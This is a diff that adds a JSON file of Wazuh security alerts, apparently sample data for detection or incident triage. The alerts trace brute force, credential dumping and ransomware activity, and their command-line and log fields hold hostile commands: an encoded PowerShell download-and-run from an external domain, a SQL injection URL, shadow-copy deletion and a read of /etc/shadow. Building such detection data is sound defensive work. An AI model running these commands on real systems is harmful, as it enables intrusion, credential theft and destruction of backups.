@@ -1,0 +1,195 @@
+[
+  {
+    "id": "wazuh-170001",
+    "timestamp": "2026-11-18T01:12:04Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-auth-srv-01",
+      "ip": "10.20.1.15"
+    },
+    "rule": {
+      "id": "5712",
+      "level": 12,
+      "description": "SSHD brute force trying to get access to the system (48 failed login attempts within 2 minutes).",
+      "groups": ["syslog", "sshd", "authentication_failures"],
+      "mitre": {
+        "id": ["T1110"],
+        "tactic": ["Credential Access"],
+        "technique": ["Brute Force"]
+      }
+    },
+    "data": {
+      "srcip": "185.220.101.45",
+      "dstip": "10.20.1.15",
+      "srcuser": "root",
+      "protocol": "SSH",
+      "failed_attempts": 48,
+      "port": 22
+    },
+    "full_log": "Nov 18 01:12:04 prod-auth-srv-01 sshd[24192]: Failed password for root from 185.220.101.45 port 49812 ssh2 (48 repeated attempts)"
+  },
+  {
+    "id": "wazuh-170002",
+    "timestamp": "2026-11-18T01:28:40Z",
+    "agent": {
+      "id": "002",
+      "name": "win-fin-wks-09",
+      "ip": "10.20.4.109"
+    },
+    "rule": {
+      "id": "91802",
+      "level": 14,
+      "description": "Suspicious PowerShell execution with Base64 EncodedCommand downloading payload from external C2 domain.",
+      "groups": ["windows", "sysmon", "powershell", "execution"],
+      "mitre": {
+        "id": ["T1059.001", "T1105"],
+        "tactic": ["Execution", "Command and Control"],
+        "technique": ["PowerShell", "Ingress Tool Transfer"]
+      }
+    },
+    "data": {
+      "srcip": "10.20.4.109",
+      "dstip": "91.215.85.142",
+      "domain": "update-telemetry-cdn.ru",
+      "srcuser": "CORP\\j.somsak",
+      "process": "powershell.exe",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQB0AGUAbABlAG0AZQB0AHIAeQAtAGMAZABuAC4AcgB1AC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
+      "file_hash": "44d88612fea8a8f36de82e1278abb02f"
+    },
+    "full_log": "Sysmon Event ID 1: Process Create: powershell.exe -NoP -NonI -W Hidden -Enc ... initiated by CORP\\j.somsak connecting to update-telemetry-cdn.ru (91.215.85.142)"
+  },
+  {
+    "id": "wazuh-170003",
+    "timestamp": "2026-11-18T01:45:19Z",
+    "agent": {
+      "id": "002",
+      "name": "win-fin-wks-09",
+      "ip": "10.20.4.109"
+    },
+    "rule": {
+      "id": "92055",
+      "level": 15,
+      "description": "LSASS memory access detected indicating possible credential dumping (Mimikatz signature).",
+      "groups": ["windows", "sysmon", "credential_access"],
+      "mitre": {
+        "id": ["T1003.001"],
+        "tactic": ["Credential Access"],
+        "technique": ["OS Credential Dumping: LSASS Memory"]
+      }
+    },
+    "data": {
+      "srcip": "10.20.4.109",
+      "srcuser": "CORP\\j.somsak",
+      "process": "rundll32.exe",
+      "target_process": "lsass.exe",
+      "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    "full_log": "Sysmon Event ID 10: Process accessed lsass.exe with GrantedAccess 0x1010 from C:\\Users\\Public\\rundll32.exe (SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)"
+  },
+  {
+    "id": "wazuh-170004",
+    "timestamp": "2026-11-18T02:05:11Z",
+    "agent": {
+      "id": "003",
+      "name": "web-portal-nginx-01",
+      "ip": "10.20.2.50"
+    },
+    "rule": {
+      "id": "31103",
+      "level": 11,
+      "description": "SQL Injection attempt detected in HTTP query string targeting /api/v1/users/search.",
+      "groups": ["web", "accesslog", "attack", "sql_injection"],
+      "mitre": {
+        "id": ["T1190"],
+        "tactic": ["Initial Access"],
+        "technique": ["Exploit Public-Facing Application"]
+      }
+    },
+    "data": {
+      "srcip": "45.155.205.233",
+      "dstip": "10.20.2.50",
+      "protocol": "HTTPS",
+      "url": "/api/v1/users/search?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users--",
+      "http_status": 200
+    },
+    "full_log": "45.155.205.233 - - [18/Nov/2026:02:05:11 +0000] \"GET /api/v1/users/search?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1\" 200 4812"
+  },
+  {
+    "id": "wazuh-170005",
+    "timestamp": "2026-11-18T02:19:50Z",
+    "agent": {
+      "id": "004",
+      "name": "db-core-postgres-01",
+      "ip": "10.20.3.10"
+    },
+    "rule": {
+      "id": "5501",
+      "level": 4,
+      "description": "PAM: Login session opened for user backup_svc during scheduled maintenance window.",
+      "groups": ["pam", "syslog", "authentication_success"]
+    },
+    "data": {
+      "srcip": "10.20.1.5",
+      "dstip": "10.20.3.10",
+      "srcuser": "backup_svc",
+      "protocol": "SSH"
+    },
+    "full_log": "Nov 18 02:19:50 db-core-postgres-01 sshd[8821]: pam_unix(sshd:session): session opened for user backup_svc by (uid=0) from 10.20.1.5"
+  },
+  {
+    "id": "wazuh-170006",
+    "timestamp": "2026-11-18T02:34:10Z",
+    "agent": {
+      "id": "005",
+      "name": "fileshare-srv-02",
+      "ip": "10.20.5.22"
+    },
+    "rule": {
+      "id": "87901",
+      "level": 15,
+      "description": "Mass file modification and shadow copy deletion detected (vssadmin.exe delete shadows /all /quiet) - Ransomware behavior.",
+      "groups": ["windows", "ransomware", "impact"],
+      "mitre": {
+        "id": ["T1486", "T1490"],
+        "tactic": ["Impact"],
+        "technique": ["Data Encrypted for Impact", "Inhibit System Recovery"]
+      }
+    },
+    "data": {
+      "srcip": "10.20.4.109",
+      "dstip": "10.20.5.22",
+      "srcuser": "CORP\\j.somsak",
+      "process": "vssadmin.exe",
+      "command_line": "vssadmin.exe delete shadows /all /quiet",
+      "file_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+    },
+    "full_log": "Sysmon Event ID 1: vssadmin.exe delete shadows /all /quiet followed by 420 file renames to .lockbit extension on fileshare-srv-02"
+  },
+  {
+    "id": "wazuh-170007",
+    "timestamp": "2026-11-18T02:49:00Z",
+    "agent": {
+      "id": "001",
+      "name": "prod-auth-srv-01",
+      "ip": "10.20.1.15"
+    },
+    "rule": {
+      "id": "5402",
+      "level": 9,
+      "description": "Successful sudo to root executed by non-standard service account www-data.",
+      "groups": ["syslog", "sudo", "privilege_escalation"],
+      "mitre": {
+        "id": ["T1548.003"],
+        "tactic": ["Privilege Escalation"],
+        "technique": ["Abuse Elevation Control Mechanism: Sudo and Sudo Caching"]
+      }
+    },
+    "data": {
+      "srcip": "10.20.2.50",
+      "dstip": "10.20.1.15",
+      "srcuser": "www-data",
+      "command_line": "/usr/bin/sudo /bin/bash -c 'cat /etc/shadow'"
+    },
+    "full_log": "Nov 18 02:49:00 prod-auth-srv-01 sudo: www-data : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c cat /etc/shadow"
+  }
+]
